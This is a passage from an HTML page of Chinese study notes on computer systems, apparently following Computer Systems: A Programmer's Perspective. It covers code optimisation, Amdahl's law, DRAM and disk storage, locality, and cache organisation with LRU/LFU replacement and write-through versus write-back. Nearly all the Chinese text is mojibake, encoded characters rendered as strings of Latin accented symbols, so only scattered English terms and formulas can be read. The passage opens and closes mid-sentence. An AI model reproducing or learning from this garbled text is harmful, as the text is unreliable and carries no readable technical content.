ã€‚</p><ul><li>æ¶ˆé™¤è¿ç»­çš„å‡½æ•°è°ƒç”¨ã€‚åœ¨å¯èƒ½æ—¶ï¼Œå°†è®¡ç®—ç§»åˆ°å¾ªç¯å¤–ã€‚è€ƒè™‘æœ‰é€‰æ‹©åœ°å¦¥åç¨‹åºçš„æ¨¡å—æ€§ä»¥<br>è·å¾—æ›´å¤§çš„æ•ˆç‡ã€‚</li><li>æ¶ˆé™¤ä¸å¿…è¦çš„å­˜å‚¨å™¨å¼•ç”¨ã€‚å¼•äººä¸´æ—¶å˜é‡æ¥ä¿å­˜ä¸­é—´ç»“æœã€‚åªæœ‰åœ¨æœ€åçš„å€¼è®¡ç®—å‡ºæ¥æ—¶ï¼Œ<br>æ‰å°†ç»“æœå­˜æ”¾åˆ°æ•°ç»„æˆ–å…¨å±€å˜é‡ä¸­ã€‚</li></ul><p><strong>3)ä½çº§ä¼˜åŒ–</strong></p><ul><li>å±•å¼€å¾ªç¯ï¼Œé™ä½å¼€é”€ï¼Œå¹¶ä¸”ä½¿å¾—è¿›ä¸€æ­¥çš„ä¼˜åŒ–æˆä¸ºå¯èƒ½ã€‚</li><li>é€šè¿‡ä½¿ç”¨ä¾‹å¦‚å¤šä¸ªç´¯ç§¯å˜é‡å’Œé‡æ–°ç»“åˆç­‰æŠ€æœ¯ï¼Œæ‰¾åˆ°æ–¹æ³•æé«˜æŒ‡ä»¤çº§å¹¶è¡Œã€‚</li><li>ç”¨åŠŸèƒ½çš„é£æ ¼é‡å†™æ¡ä»¶æ“ä½œï¼Œä½¿å¾—ç¼–è¯‘é‡‡ç”¨æ¡ä»¶æ•°æ®ä¼ é€ã€‚</li></ul><p><strong>Amdahlå®šå¾‹</strong></p><p><img src="/posts/e0eae192/image-20210609171724722.png" alt="image-20210609171724722"></p><h2 id="ç¬¬å…­ç« -å­˜å‚¨å™¨ä½“ç³»ç»“æ„"><a class="markdownIt-Anchor" href="#ç¬¬å…­ç« -å­˜å‚¨å™¨ä½“ç³»ç»“æ„"></a> ç¬¬å…­ç«  å­˜å‚¨å™¨ä½“ç³»ç»“æ„</h2><h3 id="61-å­˜å‚¨æŠ€æœ¯"><a class="markdownIt-Anchor" href="#61-å­˜å‚¨æŠ€æœ¯"></a> 6.1 å­˜å‚¨æŠ€æœ¯</h3><h4 id="11-éšæœºè®¿é—®å­˜å‚¨å™¨"><a class="markdownIt-Anchor" href="#11-éšæœºè®¿é—®å­˜å‚¨å™¨"></a> 1.1 éšæœºè®¿é—®å­˜å‚¨å™¨</h4><p>åˆ†ä¸ºé™æ€çš„(SRAM)å’ŒåŠ¨æ€çš„(DRAM)</p><p><img src="/posts/e0eae192/image-20210614140955548.png" alt="image-20210614140955548"></p><p><strong>ä¼ ç»Ÿçš„DRAM</strong></p><p><img src="/posts/e0eae192/image-20210614141026087.png" alt="image-20210614141026087"></p><p><strong>å­˜å‚¨å™¨æ¨¡å—</strong></p><p><img src="/posts/e0eae192/image-20210614141219177.png" alt="image-20210614141219177"></p><h4 id="12-ç£ç›˜å­˜å‚¨"><a class="markdownIt-Anchor" href="#12-ç£ç›˜å­˜å‚¨"></a> 1.2 ç£ç›˜å­˜å‚¨</h4><p>ç£ç›˜æ˜¯å¹¿ä¸ºåº”ç”¨çš„ä¿å­˜å¤§é‡æ•°æ®çš„å­˜å‚¨è®¾å¤‡ï¼Œå­˜å‚¨æ•°æ®çš„æ•°é‡çº§å¯ä»¥è¾¾åˆ°å‡ ç™¾åˆ°å‡ åƒåƒå…†å­—èŠ‚ï¼Œè€ŒåŸºäºRAMçš„å­˜å‚¨å™¨åªèƒ½æœ‰å‡ ç™¾æˆ–å‡ åƒå…†å­—èŠ‚ã€‚ä¸è¿‡ï¼Œä»ç£ç›˜ä¸Šè¯»ä¿¡æ¯çš„æ—¶é—´ä¸ºæ¯«ç§’çº§ï¼Œä»DRAMè¯»æ¯”ä»ç£ç›˜è¯»å¿«10ä¸‡å€ï¼Œä»SRAMè¯»æ¯”ä»ç£ç›˜è¯»å¿«100ä¸‡å€ã€‚</p><p><strong>ç£ç›˜å®¹é‡è®¡ç®—</strong></p><p><img src="/posts/e0eae192/image-20210614141419194.png" alt="image-20210614141419194"></p><p><strong>ç£ç›˜æ“ä½œ</strong></p><p>ç£ç›˜ä»¥æ‰‡åŒºå¤§å°çš„å—æ¥è¯»å†™æ•°æ®ã€‚å¯¹æ‰‡åŒºçš„è®¿é—®æ—¶é—´æœ‰ä¸‰ä¸ªä¸»è¦çš„éƒ¨åˆ†ï¼šå¯»é“æ—¶é—´ã€æ—‹è½¬æ—¶é—´ã€ä¼ é€æ—¶é—´ã€‚</p><p><img src="/posts/e0eae192/image-20210614141748772.png" alt="image-20210614141748772"></p><p><img src="/posts/e0eae192/image-20210614141816855.png" alt="image-20210614141816855"></p><p>å› ä¸ºå¯»é“æ—¶é—´å’Œæ—‹è½¬å»¶è¿Ÿå¤§è‡´æ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥å°†å¯»é“æ—¶é—´ä¹˜2æ˜¯ä¼°è®¡ç£ç›˜è®¿é—®æ—¶é—´çš„ç®€å•è€Œåˆç†çš„åŠæ³•ã€‚</p><h4 id="13-å›ºæ€ç¡¬ç›˜"><a class="markdownIt-Anchor" href="#13-å›ºæ€ç¡¬ç›˜"></a> 1.3 å›ºæ€ç¡¬ç›˜</h4><p><img src="/posts/e0eae192/image-20210614162059129.png" alt="image-20210614162059129"></p><h3 id="62-å±€éƒ¨æ€§"><a class="markdownIt-Anchor" href="#62-å±€éƒ¨æ€§"></a> 6.2 å±€éƒ¨æ€§</h3><h4 id="å±€éƒ¨æ€§åŸç†"><a class="markdownIt-Anchor" href="#å±€éƒ¨æ€§åŸç†"></a> å±€éƒ¨æ€§åŸç†</h4><p>ä¸€ä¸ªç¼–å†™è‰¯å¥½çš„è®¡ç®—æœºç¨‹åºå¸¸å¸¸å…·æœ‰è‰¯å¥½çš„å±€éƒ¨æ€§ï¼Œå®ƒä»¬å€¾å‘äºå¼•ç”¨é‚»è¿‘äºå…¶ä»–æœ€è¿‘å¼•ç”¨è¿‡çš„æ•°æ®é¡¹çš„æ•°æ®é¡¹ï¼Œæˆ–è€…æœ€è¿‘å¼•ç”¨è¿‡çš„æ•°æ®é¡¹æœ¬èº«ï¼Œè¿™ç§å€¾å‘æ€§ï¼Œè¢«ç§°ä¸ºå±€éƒ¨æ€§åŸç†ã€‚</p><h4 id="é‡åŒ–è¯„ä»·å±€éƒ¨æ€§çš„ç®€å•åŸåˆ™"><a class="markdownIt-Anchor" href="#é‡åŒ–è¯„ä»·å±€éƒ¨æ€§çš„ç®€å•åŸåˆ™"></a> <strong>é‡åŒ–è¯„ä»·å±€éƒ¨æ€§çš„ç®€å•åŸåˆ™</strong></h4><ul><li>é‡å¤å¼•ç”¨åŒä¸€ä¸ªå˜é‡çš„ç¨‹åºæœ‰è‰¯å¥½çš„æ—¶é—´å±€éƒ¨æ€§ã€‚</li><li>å¯¹äºå…·æœ‰æ­¥é•¿ä¸ºkçš„å¼•ç”¨æ¨¡å¼çš„ç¨‹åºï¼Œæ­¥é•¿è¶Šå°ï¼Œç©ºé—´å±€éƒ¨æ€§è¶Šå¥½ã€‚å…·æœ‰æ­¥é•¿ä¸º1çš„å¼•ç”¨æ¨¡å¼çš„ç¨‹åºæœ‰å¾ˆå¥½çš„ç©ºé—´å±€éƒ¨æ€§ã€‚åœ¨å­˜å‚¨å™¨ä¸­ä»¥å¤§æ­¥é•¿è·³æ¥è·³å»çš„ç¨‹åºç©ºé—´å±€éƒ¨æ€§ä¼šå¾ˆå·®ã€‚</li><li>å¯¹äºå–æŒ‡ä»¤æ¥è¯´ï¼Œå¾ªç¯æœ‰å¥½çš„æ—¶é—´å’Œç©ºé—´å±€éƒ¨æ€§ã€‚å¾ªç¯ä½“è¶Šå°ï¼Œå¾ªç¯è¿­ä»£æ¬¡æ•°è¶Šå¤šï¼Œå±€éƒ¨æ€§è¶Šå¥½ã€‚</li></ul><h3 id="63-å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"><a class="markdownIt-Anchor" href="#63-å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"></a> 6.3 å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„</h3><p><img src="/posts/e0eae192/image-20210614144247180.png" alt="image-20210614144247180"></p><h4 id="å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­çš„ç¼“å­˜"><a class="markdownIt-Anchor" href="#å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­çš„ç¼“å­˜"></a> å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­çš„ç¼“å­˜</h4><p><strong>å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„çš„ä¸­å¿ƒæ€æƒ³</strong></p><p>å¯¹äºæ¯ä¸ªk,ä½äºkå±‚çš„æ›´å¿«æ›´å°çš„å­˜å‚¨è®¾å¤‡ä½œä¸ºä½äºk+1å±‚çš„æ›´å¤§æ›´æ…¢çš„å­˜å‚¨è®¾å¤‡çš„ç¼“å­˜ã€‚æ¢å¥è¯è¯´ï¼Œå±‚æ¬¡ç»“æ„ä¸­çš„æ¯ä¸€å±‚éƒ½ç¼“å­˜æ¥è‡ªè¾ƒä½ä¸€å±‚çš„æ•°æ®å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæœ¬åœ°ç£ç›˜ä½œä¸ºé€šè¿‡ç½‘ç»œä»è¿œç¨‹ç£ç›˜å–å‡ºçš„æ–‡ä»¶(ä¾‹å¦‚Webé¡µé¢)çš„ç¼“å­˜ï¼Œä¸»å­˜ä½œä¸ºæœ¬åœ°ç£ç›˜ä¸Šæ•°æ®çš„ç¼“å­˜ï¼Œä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€å°çš„ç¼“å­˜CPUå¯„å­˜å™¨é›†åˆã€‚</p><p><strong>ç¼“å­˜å‘½ä¸­</strong></p><p>å½“ç¨‹åºéœ€è¦ç¬¬k+1å±‚çš„æŸä¸ªæ•°æ®å¯¹è±¡dæ—¶ï¼Œå®ƒé¦–å…ˆåœ¨å½“å‰å­˜å‚¨åœ¨ç¬¬kå±‚çš„ä¸€ä¸ªå—ä¸­æŸ»æ‰¾dã€‚å¦‚æœdåˆšå¥½ç¼“å­˜åœ¨ç¬¬kå±‚ä¸­ï¼Œé‚£ä¹ˆå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„<strong>ç¼“å­˜å‘½ä¸­</strong>( cache hit)ã€‚</p><p><strong>ç¼“å­˜ä¸å‘½ä¸­</strong></p><p>å¦ãƒ¼æ–¹é¢ï¼Œå¦‚æœç¬¬kå±‚ä¸­æ²¡æœ‰ç¼“å­˜æ•°æ®å¯¹è±¡d,é‚£ä¹ˆå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„<strong>ç¼“å­˜ä¸å‘½ä¸­</strong>ï¼ˆ cache miss).å½“å‘ç”Ÿç¼“å­˜ä¸å‘½ä¸­æ—¶ï¼Œç¬¬kå±‚çš„ç¼“å­˜ä»ç¬¬k+1å±‚ç¼“å­˜ä¸­å–å‡ºåŒ…å«dçš„é‚£ä¸ªå—ï¼Œå¦‚æœç¬¬kå±‚çš„ç¼“å­˜å·²ç»æ»¡äº†çš„è¯ï¼Œå¯èƒ½å°±ä¼šè¦†ç›–ç°å­˜çš„ä¸€ä¸ªå—ã€‚</p><p>è¦†ç›–ä¸€ä¸ªç°å­˜çš„å—çš„è¿‡ç¨‹ç§°ä¸º<strong>æ›¿æ¢</strong>( replacing)æˆ–<strong>é©±é€</strong>( evicting)è¿™ä¸ªå—ã€‚è¢«é©±é€çš„è¿™ä¸ªå—æœ‰æ—¶ä¹Ÿç§°ä¸º<strong>ç‰ºç‰²å—</strong>( victim block)ã€‚å†³å®šè¯¥æ›¿æ¢å“ªä¸ªå—æ˜¯ç”±ç¼“å­˜çš„<strong>æ›¿æ¢ç­–ç•¥</strong>(replacement policy)æ¥æ§åˆ¶çš„ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå…·æœ‰éšæœºæ›¿æ¢ç­–ç•¥çš„ç¼“å­˜ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªç‰ºæ€§å—ã€‚ä¸€ä¸ªå…·æœ‰æœ€è¿‘æœ€å°‘è¢«ä½¿ç”¨(LRU)æ›¿æ¢ç­–ç•¥çš„ç¼“å­˜ä¼šé€‰æ‹©é‚£ä¸ªæœ€åè¢«è®¿é—®çš„æ—¶é—´è·ç°åœ¨æœ€è¿œçš„å—ã€‚</p><p><strong>ç¼“å­˜ä¸å‘½ä¸­çš„ç§ç±»</strong></p><ul><li><p>å†·ä¸å‘½ä¸­</p><p>å¦‚æœç¬¬kå±‚çš„ç¼“å­˜æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆå¯¹ä»»ä½•æ•°æ®å¯¹è±¡çš„è®¿é—®éƒ½ä¼šä¸å‘½ä¸­ã€‚ä¸€ä¸ªç©ºçš„ç¼“å­˜æœ‰æ—¶ç§°ä¸ºå†·ç¼“å­˜( cold cache)ï¼Œæ­¤ç±»ä¸å‘½ä¸­ç§°ä¸º<strong>å¼ºåˆ¶æ€§ä¸å‘½ä¸­</strong>æˆ–<strong>å†·ä¸å‘½ä¸­</strong></p></li><li><p>å†²çªä¸å‘½ä¸­</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¼“å­˜è¶³å¤Ÿå¤§ï¼Œèƒ½å¤Ÿä¿å­˜è¢«å¼•ç”¨çš„æ•°æ®å¯¹è±¡ï¼Œä½†æ˜¯å› ä¸ºè¿™äº›å¯¹è±¡ä¼šæ˜ å°„åˆ°åŒä¸€ä¸ªç¼“å­˜å—ï¼Œç¼“å­˜ä¼šä¸€ç›´ä¸å‘½ä¸­ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœç¨‹åºè¯·æ±‚å—0,ç„¶åå—8,ç„¶åå—0,ç„¶åå—8,ä¾æ­¤ç±»æ¨ï¼Œåœ¨ç¬¬kå±‚çš„ç¼“å­˜ä¸­ï¼Œå¯¹è¿™ä¸¤ä¸ªå—çš„æ¯æ¬¡å¼•ç”¨éƒ½ä¼šä¸å‘½ä¸­ï¼Œå³ä½¿æ˜¯è¿™ä¸ªç¼“å­˜æ€»å…±å¯ä»¥å®¹çº³4ä¸ªå—ã€‚</p></li><li><p>å®¹é‡ä¸å‘½ä¸­</p><p>å½“å·¥ä½œé›†çš„å¤§å°è¶…è¿‡ç¼“å­˜çš„å¤§å°æ—¶ï¼Œç¼“å­˜ä¼šç»å†<strong>å®¹é‡ä¸å‘½ä¸­</strong>( capacity miss)ã€‚æ¢å¥è¯è¯´ï¼Œç¼“å­˜å°±æ˜¯å¤ªå°äº†ï¼Œä¸èƒ½å¤„ç†è¿™ä¸ªå·¥ä½œé›†ã€‚</p></li></ul><h3 id="64-é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨"><a class="markdownIt-Anchor" href="#64-é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨"></a> 6.4 é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨</h3><h4 id="41-é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»“æ„"><a class="markdownIt-Anchor" href="#41-é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»“æ„"></a> 4.1 é€šç”¨çš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ç»“æ„</h4><p>è€ƒè™‘ä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼Œå…¶ä¸­æ¯ä¸ªå­˜å‚¨å™¨åœ°å€æœ‰mä½ï¼Œå½¢æˆM=2<sup>m</sup>ä¸ªä¸åŒçš„åœ°å€ã€‚å¦‚å›¾6-27aæ‰€ç¤ºã€‚</p><p>è¿™æ ·ä¸€ä¸ªæœºå™¨çš„é«˜é€Ÿç¼“å­˜è¢«ç»„ç»‡æˆä¸€ä¸ªæœ‰S=2<sup>s</sup>ä¸ª<strong>é«˜é€Ÿç¼“å­˜ç»„</strong>çš„æ•°ç»„ã€‚</p><p>æ¯ä¸ªç»„åŒ…å«Eä¸ª<strong>é«˜é€Ÿç¼“å­˜è¡Œ</strong>( cache line)ã€‚</p><p>æ¯ä¸ªè¡Œæ˜¯ç”±ä¸€ä¸ªB=2<sup>b</sup>å­—èŠ‚çš„<strong>æ•°æ®å—</strong>( block)ç»„æˆçš„ï¼Œä¸€ä¸ª<br>æœ‰æ•ˆä½( valid bit)æŒ‡æ˜è¿™ä¸ªè¡Œæ˜¯å¦åŒ…å«æœ‰æ„ä¹‰çš„ä¿¡æ¯ï¼Œè¿˜æœ‰t=m-(b+s)ä¸ªæ ‡è®°ä½(æ˜¯å½“å‰å—çš„å­˜å‚¨å™¨åœ°å€çš„ä½çš„ä¸€ä¸ªå­é›†ï¼‰ï¼Œå®ƒä»¬å”¯ä¸€åœ°æ ‡è¯†å­˜å‚¨åœ¨è¿™ä¸ªé«˜é€Ÿç¼“å­˜è¡Œä¸­çš„å—ã€‚</p><p><img src="/posts/e0eae192/image-20210614150943188.png" alt="image-20210614150943188"></p><p><strong>é«˜é€Ÿç¼“å­˜çš„å¤§å°</strong>ï¼šC=SÃ—EÃ—B</p><p><img src="/posts/e0eae192/image-20210614152049400.png" alt="image-20210614152049400"></p><h4 id="42-ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜"><a class="markdownIt-Anchor" href="#42-ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜"></a> 4.2 ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜</h4><p>æ ¹æ®Eï¼ˆæ¯ä¸ªç»„çš„é«˜é€Ÿç¼“å­˜è¡Œæ•°ï¼‰é«˜é€Ÿç¼“å­˜è¢«åˆ†ä¸ºä¸åŒçš„ç±»ã€‚æ¯ä¸ªç»„åªæœ‰ä¸€è¡Œ(E=1)çš„é«˜é€Ÿç¼“å­˜ç§°ä¸º<strong>ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜</strong></p><p><img src="/posts/e0eae192/image-20210614152338888.png" alt="image-20210614152338888"></p><p><strong>1.ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜çš„ç»„é€‰æ‹©</strong></p><p>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé«˜é€Ÿç¼“å­˜ä»wçš„åœ°å€ä¸­é—´æŠ½å–å‡ºsä¸ªç»„ç´¢å¼•ä½ã€‚è¿™äº›ä½è¢«è§£é‡Šæˆä¸€ä¸ªå¯¹åº”äºä¸ªç»„å·çš„æ— ç¬¦å·æ•´æ•°ã€‚æ¢å¥è¯æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æŠŠé«˜é€Ÿç¼“å­˜çœ‹æˆæ˜¯ä¸€ä¸ªå…³äºç»„çš„ä¸€ç»´æ•°ç»„ï¼Œé‚£ä¹ˆè¿™äº›ç»„ç´¢å¼•ä½å°±æ˜¯ä¸€ä¸ªåˆ°è¿™ä¸ªæ•°ç»„çš„ç´¢å¼•ã€‚</p><p><img src="/posts/e0eae192/image-20210614152556380.png" alt="image-20210614152556380"></p><p><strong>2.ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜çš„è¡ŒåŒ¹é…</strong></p><p>å½“ä¸”ä»…å½“è®¾ç½®äº†æœ‰æ•ˆä½ï¼Œè€Œä¸”é«˜é€Ÿç¼“å­˜è¡Œä¸­çš„æ ‡è®°ä¸wçš„åœ°å€ä¸­çš„æ ‡è®°ç›¸åŒ¹é…æ—¶ï¼Œè¿™ä¸€è¡Œä¸­åŒ…å«wçš„ä¸€ä¸ªæ‹·è´ã€‚</p><p><strong>3.ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜çš„å­—é€‰æ‹©</strong></p><p>å¦‚å›¾6-31æ‰€ç¤ºï¼Œå—åç§»ä½æä¾›äº†æ‰€éœ€è¦çš„å­—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åç§»ã€‚å°±åƒæˆ‘ä»¬æŠŠé«˜é€Ÿç¼“å­˜çœ‹æˆä¸€ä¸ªè¡Œçš„æ•°ç»„ä¸€æ ·ï¼Œæˆ‘ä»¬æŠŠå—çœ‹æˆä¸€ä¸ªå­—èŠ‚çš„æ•°ç»„ï¼Œè€Œå­—èŠ‚åç§»æ˜¯åˆ°è¿™ä¸ªæ•°ç»„çš„ä¸€ä¸ªç´¢å¼•ã€‚åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå—åç§»ä½æ˜¯100<sub>2</sub>,å®ƒè¡¨æ˜wçš„æ‹·è´æ˜¯ä»å—ä¸­çš„å­—èŠ‚4å¼€å§‹çš„ï¼ˆæˆ‘ä»¬å‡è®¾å­—é•¿ä¸º4å­—èŠ‚ï¼‰ã€‚</p><p><img src="/posts/e0eae192/image-20210614152831935.png" alt="image-20210614152831935"></p><p><strong>4.ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ä¸­ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢</strong></p><p>å¦‚æœç¼“å­˜ä¸å‘½ä¸­ï¼Œé‚£ä¹ˆå®ƒéœ€è¦ä»å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­çš„ä¸‹ä¸€å±‚å–å‡ºè¢«è¯·æ±‚çš„å—ï¼Œç„¶åå°†æ–°çš„å—å­˜å‚¨åœ¨ç»„ç´¢å¼•ä½æŒ‡ç¤ºçš„ç»„ä¸­çš„ä¸€ä¸ªé«˜é€Ÿç¼“å­˜è¡Œä¸­ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œå¦‚æœç»„ä¸­éƒ½æ˜¯æœ‰æ•ˆé«˜é€Ÿç¼“å­˜è¡Œäº†ï¼Œé‚£ä¹ˆå¿…é¡»è¦é©±é€å‡ºä¸€ä¸ªç°å­˜çš„è¡Œã€‚å¯¹äºç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜æ¥è¯´ï¼Œæ¯ä¸ªç»„åªåŒ…å«æœ‰ä¸€è¡Œï¼Œæ›¿æ¢ç­–ç•¥éå¸¸ç®€å•ï¼š<strong>ç”¨æ–°å–å‡ºçš„è¡Œæ›¿æ¢å½“å‰çš„è¡Œ</strong>ã€‚</p><ul><li>ç”¨ä¸­é—´ä½åšç´¢å¼•é«˜é€Ÿç¼“å­˜çš„ä½¿ç”¨æ•ˆç‡æ›´é«˜ã€‚</li></ul><h4 id="43-ç»„ç›¸è¿é«˜é€Ÿç¼“å­˜"><a class="markdownIt-Anchor" href="#43-ç»„ç›¸è¿é«˜é€Ÿç¼“å­˜"></a> 4.3 ç»„ç›¸è¿é«˜é€Ÿç¼“å­˜</h4><p><strong>1.ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„ç»„é€‰æ‹©</strong><br>å®ƒçš„ç»„é€‰æ‹©ä¸ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜çš„ç»„é€‰æ‹©ä¸€æ ·ï¼Œç»„ç´¢å¼•ä½æ ‡è¯†ç»„ã€‚</p><p><img src="/posts/e0eae192/image-20210614160744314.png" alt="image-20210614160744314"></p><p><strong>2.ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©</strong></p><p>å›¾6-36å±•ç¤ºäº†ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­è¡ŒåŒ¹é…çš„åŸºæœ¬æ€æƒ³ã€‚è¿™é‡Œçš„ä¸€ä¸ªé‡è¦æ€æƒ³å°±æ˜¯ç»„ä¸­çš„ä»»ä½•è¡Œéƒ½å¯ä»¥åŒ…å«ä»»ä½•æ˜ å°„åˆ°è¿™ä¸ªç»„çš„å­˜å‚¨å™¨å—ã€‚æ‰€ä»¥é«˜é€Ÿç¼“å­˜å¿…é¡»<strong>æœç´¢ç»„ä¸­çš„æ¯ä¸€è¡Œ</strong>ï¼Œå¯»æ‰¾ä¸€ä¸ªæœ‰æ•ˆçš„è¡Œï¼Œå…¶æ ‡è®°ä¸åœ°å€ä¸­çš„æ ‡è®°ç›¸åŒ¹é…ã€‚å¦‚æœé«˜é€Ÿç¼“å­˜æ‰¾åˆ°äº†è¿™æ ·ä¸€è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å‘½ä¸­ï¼Œå—åç§»ä»è¿™ä¸ªå—ä¸­é€‰æ‹©ä¸€ä¸ªå­—ï¼Œå’Œå‰é¢ä¸€æ ·ã€‚</p><p><img src="/posts/e0eae192/image-20210614160949149.png" alt="image-20210614160949149"></p><p><strong>3.ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢</strong></p><p>æœ‰ç©ºè¡Œé€‰æ‹©ç©ºè¡Œã€‚</p><p>æœ€ç®€å•çš„æ›¿æ¢ç­–ç•¥æ˜¯<strong>éšæœºé€‰æ‹©è¦æ›¿æ¢çš„</strong>è¡Œã€‚</p><p><strong>æœ€ä¸å¸¸ä½¿ç”¨</strong>( Least-frequently-Used,LFU)ç­–ç•¥ä¼šæ›¿æ¢åœ¨<br>è¿‡å»æŸä¸ªæ—¶é—´çª—å£å†…å¼•ç”¨æ¬¡æ•°æœ€å°‘çš„é‚£ä¸€è¡Œã€‚</p><p><strong>æœ€è¿‘æœ€å°‘ä½¿ç”¨</strong>( Least- Recently-Used,LRU)ç­–ç•¥ä¼šæ›¿æ¢æœ€åä¸€æ¬¡è®¿é—®æ—¶é—´æœ€ä¹…è¿œçš„é‚£ä¸€è¡Œã€‚æ‰€æœ‰è¿™äº›ç­–ç•¥éƒ½éœ€è¦é¢å¤–çš„æ—¶é—´å’Œç¡¬ä»¶ã€‚</p><h4 id="44-å…¨ç›¸è¿é«˜é€Ÿç¼“å­˜"><a class="markdownIt-Anchor" href="#44-å…¨ç›¸è¿é«˜é€Ÿç¼“å­˜"></a> 4.4 å…¨ç›¸è¿é«˜é€Ÿç¼“å­˜</h4><p><img src="/posts/e0eae192/image-20210614161050792.png" alt="image-20210614161050792"></p><p><strong>1.å…¨ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„ç»„é€‰æ‹©</strong></p><p><img src="/posts/e0eae192/image-20210614161201608.png" alt="image-20210614161201608"></p><p><strong>2.å…¨ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©</strong></p><p>å…¨ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©ä¸ç»„ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„æ˜¯ä¸€æ ·çš„ï¼Œå¦‚å›¾6-39æ‰€ç¤ºã€‚å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ä¸»è¦æ˜¯ä¸ªè§„æ¨¡å¤§å°çš„é—®é¢˜ã€‚å› ä¸ºé«˜é€Ÿç¼“å­˜ç”µè·¯å¿…é¡»å¹¶è¡Œåœ°æœç´¢è®¸å¤šç›¸åŒ¹é…çš„æ ‡è®°ï¼Œé€ ä¸€ä¸ªåˆå¤§åˆå¿«çš„ç›¸è”é«˜é€Ÿç¼“å­˜å¾ˆå›°éš¾ï¼Œè€Œä¸”å¾ˆæ˜‚è´µã€‚å› æ­¤ï¼Œå…¨ç›¸è”é«˜é€Ÿç¼“å­˜åªé€‚åˆåšå°çš„é«˜é€Ÿç¼“å­˜ï¼Œä¾‹å¦‚è™šæ‹Ÿå­˜å‚¨å™¨ç³»ç»Ÿä¸­çš„ç¿»è¯‘å¤‡ç”¨ç¼“å†²å™¨(TLB),å®ƒç¼“å­˜é¡µè¡¨é¡¹ã€‚</p><p><img src="/posts/e0eae192/image-20210614161349454.png" alt="image-20210614161349454"></p><h4 id="45-æœ‰å…³å†™çš„é—®é¢˜"><a class="markdownIt-Anchor" href="#45-æœ‰å…³å†™çš„é—®é¢˜"></a> 4.5 æœ‰å…³å†™çš„é—®é¢˜</h4><p>**ç¬¬ä¸€ä¸ªé—®é¢˜ï¼š**åœ¨é«˜é€Ÿç¼“å­˜æ›´æ–°äº†å®ƒçš„wçš„æ‹·è´ä¹‹åï¼Œæ€ä¹ˆæ›´æ–°wåœ¨å±‚æ¬¡ç»“æ„ä¸­ç´§æ¥ç€ä½ä¸€å±‚ä¸­çš„æ‹·è´ï¼Ÿ</p><ul><li><p><strong>ç›´å†™</strong></p><p>å°±æ˜¯ç«‹å³å°†wçš„é«˜é€Ÿç¼“å­˜å—å†™å›åˆ°ç´§æ¥ç€çš„ä½ä¸€å±‚ä¸­ã€‚è™½ç„¶ç®€å•ï¼Œä½†æ˜¯ç›´å†™çš„ç¼ºç‚¹æ˜¯æ¯æ¬¡å†™éƒ½ä¼šå¼•èµ·æ€»çº¿æµé‡ã€‚</p></li><li><p><strong>å†™å›</strong></p><p>å°½å¯èƒ½åœ°æ¨è¿Ÿå­˜å‚¨å™¨æ›´æ–°ï¼Œåªæœ‰å½“æ›¿æ¢ç®—æ³•è¦é©±é€æ›´æ–°è¿‡çš„å—æ—¶ï¼Œæ‰æŠŠå®ƒå†™åˆ°ç´§æ¥ç€çš„ä½ä¸€å±‚ä¸­ã€‚ç”±äºå±€éƒ¨æ€§ï¼Œå†™å›èƒ½æ˜¾è‘—åœ°å‡å°‘æ€»çº¿æµé‡ï¼Œä½†æ˜¯å®ƒçš„ç¼ºç‚¹æ˜¯å¢åŠ 